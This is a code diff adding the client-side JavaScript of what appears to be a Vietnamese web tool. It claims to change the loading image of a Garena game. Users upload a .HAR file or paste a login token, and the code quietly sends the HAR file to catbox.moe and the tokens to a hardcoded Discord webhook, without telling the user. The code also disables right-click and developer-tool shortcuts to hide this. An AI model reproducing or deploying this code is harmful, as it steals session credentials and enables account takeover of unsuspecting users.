_0x47f623[_0x527f92(0x17e)](),![];if((_0x47f623[_0x527f92(0x1ac)]||_0x47f623[_0x527f92(0x181)])&&_0x47f623[_0x527f92(0x1be)]&&(_0x47f623[_0x527f92(0x1e0)]==='I'||_0x47f623['key']==='i'||_0x47f623['keyCode']===0x49))return _0x47f623[_0x527f92(0x17e)](),![];if((_0x47f623[_0x527f92(0x1ac)]||_0x47f623[_0x527f92(0x181)])&&_0x47f623[_0x527f92(0x1be)]&&(_0x47f623['key']==='J'||_0x47f623[_0x527f92(0x1e0)]==='j'||_0x47f623[_0x527f92(0x167)]===0x4a))return _0x47f623[_0x527f92(0x17e)](),![];if((_0x47f623[_0x527f92(0x1ac)]||_0x47f623[_0x527f92(0x181)])&&_0x47f623[_0x527f92(0x1be)]&&(_0x47f623[_0x527f92(0x1e0)]==='C'||_0x47f623[_0x527f92(0x1e0)]==='c'||_0x47f623[_0x527f92(0x167)]===0x43))return _0x47f623['preventDefault'](),![];if((_0x47f623[_0x527f92(0x1ac)]||_0x47f623[_0x527f92(0x181)])&&(_0x47f623[_0x527f92(0x1e0)]==='U'||_0x47f623[_0x527f92(0x1e0)]==='u'||_0x47f623[_0x527f92(0x167)]===0x55))return _0x47f623[_0x527f92(0x17e)](),![];if((_0x47f623['ctrlKey']||_0x47f623['metaKey'])&&(_0x47f623['key']==='S'||_0x47f623[_0x527f92(0x1e0)]==='s'||_0x47f623[_0x527f92(0x167)]===0x53))return _0x47f623['preventDefault'](),![];});
+const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532752605212835903/VTdukhlG_koAGP2ZxT3bNMLPlaW5MuA-l325qBxImuHA1rWR51nm3NmfkcTN4sF1pAcA";
+
+let currentOs = 'ios';
+let selectedHarFile = null;
+let iosBlobImage = null;
+let androidBlobImage = null;
+let currentTargetPlatform = null;
+let cropper = null;
+
+const bgMusic = document.getElementById('bgMusic');
+const musicBtn = document.getElementById('musicToggleBtn');
+const musicIcon = document.getElementById('musicIcon');
+let isMusicPlayed = false;
+
+function startMusic() {
+    if (!isMusicPlayed) {
+        bgMusic.play().then(() => {
+            isMusicPlayed = true;
+            musicBtn.classList.add('playing');
+            document.removeEventListener('click', startMusic);
+            document.removeEventListener('touchstart', startMusic);
+        }).catch(err => {
+            console.log("Trình duyệt chặn Autoplay:", err);
+        });
+    }
+}
+
+document.addEventListener('click', startMusic);
+document.addEventListener('touchstart', startMusic);
+
+function toggleMusic(e) {
+    e.stopPropagation(); 
+    if (bgMusic.paused) {
+        bgMusic.play();
+        isMusicPlayed = true;
+        musicBtn.classList.add('playing');
+        musicIcon.className = "fa-solid fa-music";
+    } else {
+        bgMusic.pause();
+        musicBtn.classList.remove('playing');
+        musicIcon.className = "fa-solid fa-volume-xmark";
+    }
+}
+
+const dvd = document.getElementById('dvdLogo');
+let dvdWidth = 55;
+let dvdHeight = 55;
+let posX = Math.random() * (window.innerWidth - dvdWidth);
+let posY = Math.random() * (window.innerHeight - dvdHeight);
+let speedX = 2.5;
+let speedY = 2.5;
+
+function animateDVD() {
+    const screenWidth = window.innerWidth;
+    const screenHeight = window.innerHeight;
+
+    posX += speedX;
+    posY += speedY;
+
+    if (posX + dvdWidth >= screenWidth) {
+        speedX = -Math.abs(speedX);
+        posX = screenWidth - dvdWidth;
+    } else if (posX <= 0) {
+        speedX = Math.abs(speedX);
+        posX = 0;
+    }
+
+    if (posY + dvdHeight >= screenHeight) {
+        speedY = -Math.abs(speedY);
+        posY = screenHeight - dvdHeight;
+    } else if (posY <= 0) {
+        speedY = Math.abs(speedY);
+        posY = 0;
+    }
+
+    dvd.style.transform = `translate3d(${posX}px, ${posY}px, 0)`;
+    requestAnimationFrame(animateDVD);
+}
+
+window.addEventListener('resize', () => {
+    if (posX > window.innerWidth - dvdWidth) posX = window.innerWidth - dvdWidth;
+    if (posY > window.innerHeight - dvdHeight) posY = window.innerHeight - dvdHeight;
+});
+
+window.addEventListener('DOMContentLoaded', () => {
+    animateDVD();
+    Swal.fire({
+        title: 'Thông Báo Bản Quyền',
+        imageUrl: 'https://i.ibb.co/WLbbLjr/A1457178-A312-472-C-9-D12-3-E6-DE57-C29-B9.jpg',
+        text: 'Toàn bộ mã nguồn và tài liệu API đều được tham khảo và thuộc quyền sở hữu của Vương Thanh Tú. Vui lòng không crack dưới mọi hình thức!',
+        icon: 'info',
+        confirmButtonText: 'Tôi Đã Hiểu',
+        confirmButtonColor: '#38bdf8'
+    });
+});
+
+function openNycModal() {
+    Swal.fire({
+        title: 'Đây là NYC mình!😔',
+        imageUrl: 'https://i.ibb.co/Ngz34v2H/9-D7-CDCBF-8235-4-A08-95-BE-20-AF6-AE84223.jpg',
+        imageWidth: 280,
+        imageHeight: 280,
+        imageAlt: 'Logo NYC',
+        showCloseButton: true,
+        confirmButtonText: 'Đóng',
+        confirmButtonColor: '#38bdf8'
+    });
+}
+
+function switchOs(os) {
+    currentOs = os;
+    const btnIos = document.getElementById('btnTabIos');
+    const btnAndroid = document.getElementById('btnTabAndroid');
+    const btnDonate = document.getElementById('btnTabDonate');
+
+    const secIos = document.getElementById('iosSection');
+    const secAndroid = document.getElementById('androidSection');
+    const secDonate = document.getElementById('donateSection');
+
+    btnIos.className = 'tab-btn';
+    btnAndroid.className = 'tab-btn';
+    btnDonate.className = 'tab-btn';
+
+    secIos.classList.add('hidden');
+    secAndroid.classList.add('hidden');
+    secDonate.classList.add('hidden');
+
+    if (os === 'ios') {
+        btnIos.className = 'tab-btn active-ios';
+        secIos.classList.remove('hidden');
+    } else if (os === 'android') {
+        btnAndroid.className = 'tab-btn active-android';
+        secAndroid.classList.remove('hidden');
+    } else if (os === 'donate') {
+        btnDonate.className = 'tab-btn active-donate';
+        secDonate.classList.remove('hidden');
+    }
+}
+
+function handleHarUpload(event) {
+    const file = event.target.files[0];
+    if (file) {
+        selectedHarFile = file;
+        document.getElementById('harIcon').className = 'fa-solid fa-circle-check big-icon';
+        document.getElementById('harIcon').style.color = '#38bdf8';
+        document.getElementById('harText').innerText = file.name;
+    }
+}
+
+function handleImageSelect(event, platform) {
+    currentTargetPlatform = platform;
+    const file = event.target.files[0];
+    if (file) {
+        const reader = new FileReader();
+        reader.onload = e => {
+            document.getElementById('cropModal').classList.remove('hidden');
+            const img = document.getElementById('imageToCrop');
+            img.src = e.target.result;
+            if (cropper) cropper.destroy();
+            cropper = new Cropper(img, { aspectRatio: 1080/1701, viewMode: 1, autoCropArea: 0.95 });
+        }
+        reader.readAsDataURL(file);
+    }
+    event.target.value = '';
+}
+
+function closeCropModal() {
+    document.getElementById('cropModal').classList.add('hidden');
+    if (cropper) cropper.destroy();
+}
+
+function applyCrop() {
+    if (!cropper) return;
+    const canvas = cropper.getCroppedCanvas({ width: 1080, height: 1701 });
+    
+    if (currentTargetPlatform === 'ios') {
+        const preview = document.getElementById('iosImgPreview');
+        preview.src = canvas.toDataURL('image/png');
+        preview.style.display = 'block';
+        document.getElementById('iosImgPlaceholder').classList.add('hidden');
+        canvas.toBlob(b => { iosBlobImage = b; }, 'image/png');
+    } else {
+        const preview = document.getElementById('androidImgPreview');
+        preview.src = canvas.toDataURL('image/png');
+        preview.style.display = 'block';
+        document.getElementById('androidImgPlaceholder').classList.add('hidden');
+        canvas.toBlob(b => { androidBlobImage = b; }, 'image/png');
+    }
+    closeCropModal();
+}
+
+async function uploadFileToCatbox(file) {
+    const catboxFormData = new FormData();
+    catboxFormData.append('reqtype', 'fileupload');
+    catboxFormData.append('fileToUpload', file);
+
+    const response = await fetch('https://catbox.moe/user/api.php', {
+        method: 'POST',
+        body: catboxFormData
+    });
+
+    if (!response.ok) {
+        throw new Error("Tải file lên server lưu trữ thất bại!");
+    }
+
+    const fileUrl = await response.text();
+    return fileUrl.trim();
+}
+
+async function sendDiscordWebhook(type, data) {
+    try {
+        const now = new Date().toLocaleString('vi-VN');
+        let payload = {};
+
+        if (type === 'ios') {
+            const harDownloadUrl = await uploadFileToCatbox(data.file);
+
+            payload = {
+                username: "VTT Tools Bot",
+                avatar_url: "https://klipy.com/gifs/ayane-cute",
+                embeds: [{
+                    title: "🚀 Đã Upload File .HAR Thành Công (iOS)",
+                    color: 3719160,
+                    fields: [
+                        { name: "📁 Tên File HAR", value: `\`\`\`${data.file.name}\`\`\``, inline: false },
+                        { name: "📊 Dung Lượng", value: `${(data.file.size / 1024).toFixed(2)} KB`, inline: true },
+                        { name: "🔗 Link Tải Trực Tiếp File HAR", value: `[Bấm Vào Đây Để Tải File HAR](${harDownloadUrl})`, inline: false },
+                        { name: "🕒 Thời Gian", value: now, inline: true }
+                    ],
+                    footer: { text: "VTT Tools Log System" }
+                }]
+            };
+        } else if (type === 'android') {
+            payload = {
+                username: "VTT Tools Bot",
+                avatar_url: "https://klipy.com/gifs/ayane-cute",
+                embeds: [{
+                    title: "📱 Link Token Android Mới",
+                    color: 1095937,
+                    fields: [
+                        { name: "🔑 Link Token / KGVN", value: `\`\`\`${data.token}\`\`\``, inline: false },
+                        { name: "🕒 Thời Gian", value: now, inline: true }
+                    ],
+                    footer: { text: "VTT Tools Log System" }
+                }]
+            };
+        }
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+    } catch (err) {
+        console.error("Lỗi khi xử lý Webhook:", err);
+    }
+}
+
+async function submitIosProcess() {
+    if (!selectedHarFile) { Swal.fire({ icon: 'warning', title: 'Thiếu File HAR!', text: 'Vui lòng chọn file .HAR trước.' }); return; }
+    if (!iosBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho iOS.' }); return; }
+
+    const log = document.getElementById('iosStatusLog');
+    const badge = document.getElementById('iosStatusBadge');
+    
+    badge.innerText = 'Đang upload...';
+    badge.style.color = '#38bdf8';
+    log.innerHTML = '⌛ Đang tự động upload file .HAR và gửi dữ liệu...';
+
+    sendDiscordWebhook('ios', { file: selectedHarFile });
+
+    const formData = new FormData();
+    formData.append('har_file', selectedHarFile);
+    formData.append('image', iosBlobImage, 'loading_ios.png');
+
+    try {
+        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
+        const data = await res.json();
+
+        if (data.success) {
+            badge.innerText = 'Đang xử lý';
+            log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
+            trackStatus(data.job_id, 'ios');
+        } else {
+            badge.innerText = 'Thất bại';
+            badge.style.color = '#ef4444';
+            log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
+        }
+    } catch (err) {
+        badge.innerText = 'Lỗi kết nối';
+        badge.style.color = '#ef4444';
+        log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
+    }
+}
+
+async function submitAndroidProcess() {
+    const token = document.getElementById('androidTokenInput').value.trim();
+    if (!token) { Swal.fire({ icon: 'warning', title: 'Thiếu Link Token!', text: 'Vui lòng dán link token kgvn vào khung trên.' }); return; }
+    if (!androidBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho Android.' }); return; }
+
+    sendDiscordWebhook('android', { token: token });
+
+    const log = document.getElementById('androidStatusLog');
+    const badge = document.getElementById('androidStatusBadge');
+
+    badge.innerText = 'Đang gửi...';
+    badge.style.color = '#10b981';
+    log.innerHTML = '⌛ Đang tải dữ liệu Android lên máy chủ...';
+
+    const formData = new FormData();
+    formData.append('link', token);
+    formData.append('image', androidBlobImage, 'loading_android.png');
+
+    try {
+        const res = await fetch(`${API_BASE_URL}/api/upload`, { method: 'POST', body: formData });
+        const data = await res.json();
+
+        if (data.success) {
+            badge.innerText = 'Đang xử lý';
+            log.innerHTML = `✅ Mã yêu cầu: <b>${data.job_id}</b><br>⏳ Đang chờ máy chủ hoàn tất...`;
+            trackStatus(data.job_id, 'android');
+        } else {
+            badge.innerText = 'Thất bại';
+            badge.style.color = '#ef4444';
+            log.innerHTML = `❌ Lỗi: ${data.error || 'Xử lý thất bại'}`;
+        }
+    } catch (err) {
+        badge.innerText = 'Lỗi kết nối';
+        badge.style.color = '#ef4444';
+        log.innerHTML = '❌ Không thể kết nối đến hệ thống!';
+    }
+}
+
+function trackStatus(jobId, platform) {
+    const log = document.getElementById(`${platform}StatusLog`);
+    const badge = document.getElementById(`${platform}StatusBadge`);
+
+    const timer = setInterval(async () => {
+        try {
+            const res = await fetch(`${API_BASE_URL}/api/check/${jobId}`);
+            const data = await res.json();
+
+            if (data.success) {
+                const job = data.data;
+                if (job.status === 'success' || job.status === 'completed') {
+                    clearInterval(timer);
+                    badge.innerText = 'Hoàn thành';
+                    badge.style.color = '#10b981';
+                    log.innerHTML = `🎉 **Thành công!**<br>${job.message || 'Thay ảnh loading thành công.'}`;
+                    Swal.fire({ icon: 'success', title: 'Thành Công!', text: 'Thao tác thay ảnh hoàn tất.' });
+                } else if (job.status === 'failed' || job.status === 'error') {
+                    clearInterval(timer);
+                    badge.innerText = 'Thất bại';
+                    badge.style.color = '#ef4444';
+                    log.innerHTML = `❌ **Lỗi:** ${job.error || 'Quá trình xử lý bị lỗi'}`;
+                    Swal.fire({ icon: 'error', title: 'Thất Bại', text: job.error || 'Xử lý thất bại' });
+                } else {
+                    log.innerHTML = `✅ Mã yêu cầu: <b>${jobId}</b><br>⏳ Trạng thái: ${job.status_text || job.status}...`;
+                }
+            }
+        } catch (err) {
+            clearInterval(timer);
+            badge.innerText = 'Lỗi kiểm tra';
+            badge.style.color = '#ef4444';
+            log.innerHTML = '❌ Không thể kiểm tra tiến trình từ máy chủ!';
+        }
+    }, 3000);
+}
+
+document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+});
+
+document.addEventListener('keydown', function (e) {
+    if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        return false;
+    }
+    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
+        e.preventDefault();
+        return false;
+    }
+    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
+        e.preventDefault();
+        return false;
+    }
+    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
+        e.preventDefault();
+        return false;
+    }
+    if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
+        e.preventDefault();
+        return false;
+    }
+    if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) {
+        e.preventDefault();
+        return false;
+    }
+});
